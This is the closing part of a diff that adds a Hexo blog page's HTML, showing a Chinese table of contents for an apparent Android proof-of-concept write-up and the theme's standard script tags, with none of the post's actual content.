+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E5%88%86%E6%9E%90"><span class="nav-text">前置分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E5%86%99poc"><span class="nav-text">编写poc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5service"><span class="nav-text">连接service</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%84%E7%90%86%E4%B8%80%E6%AC%A1%E6%80%A7secret"><span class="nav-text">处理一次性secret</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E9%80%81%E6%8C%87%E4%BB%A4"><span class="nav-text">发送指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84MainActivity-java"><span class="nav-text">完整的MainActivity.java</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/lazyload.min.js"></script>
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/copyright-info.min.js"></script>
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+    
+        
+    
+
+</body>
+</html>
